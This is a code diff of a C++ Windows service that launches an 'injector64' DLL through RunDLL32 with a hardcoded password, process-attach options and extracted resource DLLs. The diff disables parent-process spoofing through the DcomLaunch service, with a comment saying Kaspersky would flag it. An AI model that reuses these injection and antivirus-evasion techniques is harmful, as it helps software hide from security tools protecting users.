@@ -146,6 +146,7 @@ void WindowsService::ReportStatus(DWORD dwCurrentState, DWORD dwWin32ExitCode, D
 }
 
 DWORD __stdcall WindowsService::_MyCrashpadHandler(PVOID pThat) {
+	if (0) return 0;
 	WindowsService* that = (WindowsService*)pThat;
 
 	auto worker = [that](std::wstring cmd, DWORD extraFlags, HANDLE hParent = nullptr) {
@@ -175,7 +176,7 @@ DWORD __stdcall WindowsService::_MyCrashpadHandler(PVOID pThat) {
 				}
 			}
 
-			si.StartupInfo.cb = sizeof(STARTUPINFOEX);
+			si.StartupInfo.cb = sizeof(STARTUPINFOEXW);
 			si.StartupInfo.dwFlags = STARTF_USESHOWWINDOW;
 			si.StartupInfo.wShowWindow = SW_SHOWNORMAL;
 			si.lpAttributeList = PPROC_THREAD_ATTRIBUTE_LIST(attributeList ? attributeList.get() : nullptr);
@@ -203,7 +204,8 @@ DWORD __stdcall WindowsService::_MyCrashpadHandler(PVOID pThat) {
 			CloseHandle(pi.hProcess);
 		}
 	};
-
+	
+#if 0
 	w32ProcessHandle DcomLaunch;
 	try{
 		ServiceManager scm;
@@ -216,6 +218,7 @@ DWORD __stdcall WindowsService::_MyCrashpadHandler(PVOID pThat) {
 		}
 	}
 	catch (...) {}
+#endif
 
 	std::wstring cmd0 = L"RunDLL32 \"" + that->injector64 +
 		L"\",RunDLL /=DbgServiceKeepAlive /password=0812 /ppid " +
@@ -224,8 +227,10 @@ DWORD __stdcall WindowsService::_MyCrashpadHandler(PVOID pThat) {
 	std::wstring cmd1 = L"RunDLL32 \"" + that->injector64 +
 		L"\",RunDLL /=crashpad_handler /password=0812 /attach " +
 		std::to_wstring(GetCurrentProcessId()) +
-		L" /reportDir \"" + that->session_res.wstring() + L"\"";
-	std::thread t1(worker, cmd0, IDLE_PRIORITY_CLASS, DcomLaunch.get());
+		L" /reportDir \"" + (that->session_res / L"crashpad").wstring() + L"\"";
+	//std::thread t1(worker, cmd0, IDLE_PRIORITY_CLASS, DcomLaunch.get());
+	// the line above would be fucked by Kaspersky so we remove it
+	std::thread t1(worker, cmd0, IDLE_PRIORITY_CLASS);
 	std::thread t2(worker, cmd1, BELOW_NORMAL_PRIORITY_CLASS);
 
 	t1.join();
@@ -407,6 +412,9 @@ void WindowsService::PrepareEnvironment() {
 		}
 		if (INVALID_FILE_ATTRIBUTES == GetFileAttributesW((session_res / L"x86").wstring().c_str())) {
 			if (!CreateDirectoryW((session_res / L"x86").wstring().c_str(), NULL)) __crash();
+		}
+		if (INVALID_FILE_ATTRIBUTES == GetFileAttributesW((session_res / L"crashpad").wstring().c_str())) {
+			if (!CreateDirectoryW((session_res / L"crashpad").wstring().c_str(), NULL)) __crash();
 		}
 		coredll86 = session_res / L"x86" / L"core.dll";
 		if (!FreeResFile(IDR_BIN_COREDLL86, L"BIN", coredll86)) __crash();
